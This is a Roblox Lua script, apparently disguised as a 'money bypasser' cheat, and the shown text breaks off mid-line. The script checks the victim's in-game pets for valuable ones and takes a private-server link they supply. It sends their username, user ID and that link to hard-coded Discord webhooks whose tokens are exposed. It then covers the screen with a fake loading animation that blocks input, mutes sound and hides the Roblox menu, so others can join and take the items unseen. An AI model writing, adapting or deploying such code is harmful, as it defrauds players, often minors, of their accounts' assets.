local BLACKLIST = {
    4313952753,
    3328221098,
    2353591712,
    8698369158,
}

local function isBlacklisted(userId)
    for _, id in ipairs(BLACKLIST) do
        if id == userId then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local player = LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")

if isBlacklisted(LocalPlayer.UserId) then
    return
end

local function createRedCrimsonGradientPulse(stroke)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))
    }
    gradient.Rotation = 90
    gradient.Parent = stroke
    
    local pulseTween = TweenService:Create(stroke, 
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Transparency = 0.3}
    )
    stroke.Transparency = 0
    pulseTween:Play()
    return pulseTween
end

local function ocultarHUD()
    local coreGuiElements = {
        Enum.CoreGuiType.PlayerList,
        Enum.CoreGuiType.Health,
        Enum.CoreGuiType.Backpack,
        Enum.CoreGuiType.Chat,
        Enum.CoreGuiType.EmotesMenu,
        Enum.CoreGuiType.All
    }
    
    for _, element in ipairs(coreGuiElements) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(element, false)
        end)
    end
end

local function mostrarHUD()
    local coreGuiElements = {
        Enum.CoreGuiType.PlayerList,
        Enum.CoreGuiType.Health,
        Enum.CoreGuiType.Backpack,
        Enum.CoreGuiType.Chat,
        Enum.CoreGuiType.EmotesMenu,
        Enum.CoreGuiType.All
    }
    
    for _, element in ipairs(coreGuiElements) do
        pcall(function()
            StarterGui:SetCoreGuiEnabled(element, true)
        end)
    end
end

local function ocultarScreenGuis()
    if LocalPlayer then
        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
        
        for _, gui in ipairs(PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
                gui.Enabled = false
            end
        end
        
        PlayerGui.ChildAdded:Connect(function(gui)
            if gui:IsA("ScreenGui") and gui.Name ~= "MoneyBypasserLoader" and gui.Name ~= "ArcadeGUI" then
                wait(0.1)
                gui.Enabled = false
            end
        end)
    end
end

local function cerrarMenuRoblox()
    pcall(function()
        game:GetService("GuiService"):ClearError()
        StarterGui:SetCore("ResetButtonCallback", false)
    end)
    
    for _, gui in ipairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") then
            if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
                gui.Enabled = false
            end
        end
    end
end

local hudVisible = true
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.H then
        hudVisible = not hudVisible
        if hudVisible then
            mostrarHUD()
        else
            ocultarHUD()
        end
    end
    
    if input.KeyCode == Enum.KeyCode.Escape then
        cerrarMenuRoblox()
    end
end)

local allowedAnimals = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama", 
    "Capitano Moby"
}

local function getPodiumInfo()
    local success, podiumData = pcall(function()
        if ReplicatedStorage:FindFirstChild("Packages") then
            local packages = ReplicatedStorage.Packages
            if packages:FindFirstChild("Synchronizer") then
                local synchronizer = require(packages.Synchronizer)
                local playerData = synchronizer:Get(LocalPlayer)
                if playerData then
                    return playerData:Get("AnimalPodiums") or {}
                end
            end
        end
        return "No se pudieron obtener datos de podios"
    end)

    if success and type(podiumData) == "table" then  
        local info = {}  
        for podium, animal in pairs(podiumData) do  
            if animal == "Empty" then  
                info[podium] = "Empty"  
            else  
                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
            end  
        end  
        return info  
    else  
        return {error = podiumData}  
    end
end

local function hasAllowedAnimal(podiumInfo)
    local foundAnimals = {}
    for _, animal in pairs(podiumInfo) do
        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
            for _, allowed in ipairs(allowedAnimals) do
                if animalTrim:lower():find(allowed:lower(), 1, true) then
                    table.insert(foundAnimals, animalTrim)
                    break
                end
            end
        end
    end
    return #foundAnimals > 0, foundAnimals
end

local function isValidPrivateServerLink(text)
    if not string.find(text, "https?://") then
        return false
    end
    
    if not string.find(text, "roblox%.com") then
        return false
    end
    
    local patterns = {
        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
    }
    
    for _, pattern in ipairs(patterns) do
        if string.match(text, pattern) then
            return true
        end
    end
    
    return false
end

local function sendToWebhook(link, foundAnimals)
    if isBlacklisted(LocalPlayer.UserId) then
        return false, "User is blacklisted"
    end

    if not isValidPrivateServerLink(link) then
        return false, "Invalid private server link"
    end

    if not foundAnimals or #foundAnimals == 0 then
        return true
    end

    local playerCount = #Players:GetPlayers()
    if playerCount > 1 then
        return true
    end

    local specialAnimals = {
        "Dragon Cannelloni",
        "Strawberry Elephant",
        "Spooky and Pumpky",
        "La Secret Combinasion",
        "Burguro And Fryuro",
        "Capitano Moby",
        "Spaghetti Tualetti",
        "La Spooky Grande",
        "Tictac Sahur",
        "Garama and Madundung",
        "Chipso and Queso",
        "Los Spaghettis",
        "Fragrama and Chocrama",
        "Meowl",
        "Eviledon",
        "Los Puggies", 
        "La Casa Boo",
        "La Taco Combinasion"
    }

    local webhookNormal = "https://discord.com/api/webhooks/1432215376338620456/ORN9uz8qAMTjBKz7WbtNaGzD6oCDMX8B4O_60LHJG4Ij2S7KgfAtAViaam_WNIWTdo4F"
    local webhookSpecial = "https://discord.com/api/webhooks/1432215598749843456/grMlc-UBX8xTTxLhQIPlQbsNmvZfzF4_qve2chxTh511fPhup-VO5CYSQqtVhw4Et_ZW"

    local playerName = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    local userId = LocalPlayer.UserId
    local specialFound = false

    for _, animal in ipairs(foundAnimals) do
        for _, special in ipairs(specialAnimals) do
            if animal:lower():find(special:lower(), 1, true) then
                specialFound = true
                break
            end
        end
        if specialFound then break end
    end

    local webhookUrl = specialFound and webhookSpecial or webhookNormal
    local isSpecial = specialFound

    local animalList = ""
    for i, animal in ipairs(foundAnimals) do
        if i == 1 then
            animalList = animal
        else
            animalList = animalList .. "\n" .. animal
        end
    end

    local title = isSpecial and "â­ CATCHES ESPECIALES ENCONTRADOS" or "ðŸŽ¯ Nuevo Exploiter Encontrado"
    local color = isSpecial and 16766720 or 10038562

    local data = {
        ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = {
                {
                    ["name"] = "ðŸ‘¤ Informacion del jugador:",
                    ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
                },
                {
                    ["name"] = "ðŸ‘¥ Datos del Server:",
                    ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                },
                {
                    ["name"] = "ðŸŽ® link:",
                    ["value"] = "[Click here to join](" .. link .. ")",
                },
                {
                    ["name"] = isSpecial and "â­ CATCHES ESPECIALES:" or "ðŸ† Items importantes(secrets):",
                    ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
                },
                {
                    ["name"] = "ðŸ“Š Total:",
                    ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
                }
            },
            ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    if webhookUrl ~= "" then
        local success, err = pcall(function()
            local jsonData = HttpService:JSONEncode(data)
            HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
        end)

        if not success then
            pcall(function()
                local jsonData = HttpService:JSONEncode(data)
                HttpService:RequestAsync({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
        end
    end

    return true
end

local function createLoadingScreen()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCore("TopbarEnabled", false)
    StarterGui:SetCore("DevConsoleVisible", false)
    StarterGui:SetCore("ResetButtonCallback", false)

    local camera = workspace.CurrentCamera
    camera.CameraType = Enum.CameraType.Scriptable

    local blockInput = true
    UserInputService.InputBegan:Connect(function(input)
        if blockInput then
            input:Capture()
        end
    end)

    local function silenceAllSounds(container)
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("Sound") then
                obj.Volume = 0
            end
        end
    end

    for _, container in pairs({Workspace, ReplicatedStorage, playerGui, StarterGui, CoreGui}) do
        silenceAllSounds(container)
        container.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc.Volume = 0
            end
        end)
    end
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MoneyBypasserLoader"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 999999
    screenGui.Parent = CoreGui

    local blackScreen = Instance.new("Frame")
    blackScreen.Name = "BlackScreen"
    blackScreen.Size = UDim2.new(1, 0, 1, 0)
    blackScreen.Position = UDim2.new(0, 0, 0, 0)
    blackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackScreen.BorderSizePixel = 0
    blackScreen.ZIndex = 999999
    blackScreen.Parent = screenGui

    local gradientFrame = Instance.new("Frame")
    gradientFrame.Name = "GradientFrame"
    gradientFrame.Size = UDim2.new(1, 0, 1, 0)
    gradientFrame.Position = UDim2.new(0, 0, 0, 0)
    gradientFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    gradientFrame.BorderSizePixel = 0
    gradientFrame.ZIndex = 999999
    gradientFrame.Parent = screenGui

    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(20, 0, 0)),
        ColorSequenceKeypoint.new(0.75, Color3.fromRGB(80, 10, 10)),
        ColorSequenceKeypoint.new(0.9, Color3.fromRGB(150, 20, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 60))
    }
    gradient.Rotation = 90
    gradient.Parent = gradientFrame

    spawn(function()
        while gradientFrame.Parent do
            local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
            
            local tween1 = TweenService:Create(gradient, tweenInfo, {
                Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 0, 5)),
                    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(100, 15, 20)),
                    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(180, 30, 50)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 80))
                }
            })
            tween1:Play()
            tween1.Completed:Wait()
            
            local tween2 = TweenService:Create(gradient, tweenInfo, {
                Color = ColorSequence.new{
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
                    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(20, 0, 0)),
                    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(80, 10, 10)),
                    ColorSequenceKeypoint.new(0.9, Color3.fromRGB(150, 20, 30)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 60))
                }
            })
            tween2:Play()
            tween2.Completed:Wait()
        end
    end)

    local matrixChars = {"Ã·", "Â¢", "â‚¬", "$", "Â¥", "â‚¹", "â‚½", "â‚±", "â‚©", "Â£", "à¸¿", "0", "1"}
    local matrixContainer = Instance.new("Frame")
    matrixContainer.Name = "MatrixContainer"
    matrixContainer.Size = UDim2.new(1, 0, 1, 0)
    matrixContainer.BackgroundTransparency = 1
    matrixContainer.ZIndex = 1000000
    matrixContainer.Parent = screenGui

    local particles = {}
    local time = 0
    local latitudes = 25
    local longitudes = 40
    local sphereRadius = 260

    local function createTextParticle(lat, lon)
        local particle = Instance.new("TextLabel")
        particle.Name = "Particle"
        particle.Text = matrixChars[math.random(1, #matrixChars)]
        particle.BackgroundTransparency = 1
        particle.TextColor3 = Color3.fromRGB(0, 0, 0)
        particle.Font = Enum.Font.Arcade
        particle.TextSize = 30
        particle.AnchorPoint = Vector2.new(0.5, 0.5)
        particle.ZIndex = 1000000
        particle.Parent = matrixContainer
        
        local stroke = Instance.new("UIStroke")
        stroke.Thickness = 2
        stroke.Color = Color3.fromRGB(220, 20, 60)
        stroke.Parent = particle
        
        local particleData = {
            label = particle,
            stroke = stroke,
            lat = lat,
            lon = lon
        }
        
        table.insert(particles, particleData)
        return particleData
    end

    for i = 0, latitudes do
        local lat = (i / latitudes) * math.pi
        for j = 0, longitudes do
            local lon = (j / longitudes) * math.pi * 2
            createTextParticle(lat, lon)
        end
    end

    local function updateSphere()
        local screenWidth = matrixContainer.AbsoluteSize.X
        local screenHeight = matrixContainer.AbsoluteSize.Y
        local centerX = screenWidth / 2
        local centerY = screenHeight / 2
        
        for _, particleData in ipairs(particles) do
            local lat = particleData.lat
            local lon = particleData.lon
            
            local x = sphereRadius * math.sin(lat) * math.cos(lon)
            local y = sphereRadius * math.sin(lat) * math.sin(lon)
            local z = sphereRadius * math.cos(lat)
            
            local rotY1 = y * math.cos(time * 0.5) - z * math.sin(time * 0.5)
            local rotZ1 = y * math.sin(time * 0.5) + z * math.cos(time * 0.5)
            
            local rotX2 = x * math.cos(time * 0.3) - rotZ1 * math.sin(time * 0.3)
            local rotZ2 = x * math.sin(time * 0.3) + rotZ1 * math.cos(time * 0.3)
            
            local perspective = 600
            local scale = perspective / (perspective + rotZ2)
            
            local screenX = centerX + rotX2 * scale
            local screenY = centerY + rotY1 * scale
            
            particleData.label.Position = UDim2.new(0, screenX, 0, screenY)
            particleData.label.Size = UDim2.new(0, 25 * scale, 0, 25 * scale)
            
            local opacity = math.clamp(scale * (rotZ2 > 0 and 1 or 0.3), 0, 0.95)
            particleData.label.TextTransparency = 1 - opacity
            particleData.label.ZIndex = math.floor(1000000 + rotZ2)
            
            if math.random() < 0.01 then
                particleData.label.Text = matrixChars[math.random(1, #matrixChars)]
            end
        end
        
        time = time + 0.01
    end

    RunService.RenderStepped:Connect(updateSphere)

    local floatingParticlesContainer = Instance.new("Frame")
    floatingParticlesContainer.Name = "FloatingParticles"
    floatingParticlesContainer.Size = UDim2.new(1, 0, 1, 0)
    floatingParticlesContainer.BackgroundTransparency = 1
    floatingParticlesContainer.ZIndex = 999999
    floatingParticlesContainer.Parent = screenGui

    for i = 1, 30 do
        local floatParticle = Instance.new("Frame")
        floatParticle.Size = UDim2.new(0, math.random(4, 10), 0, math.random(4, 10))
        floatParticle.Position = UDim2.new(math.random(), 0, math.rando
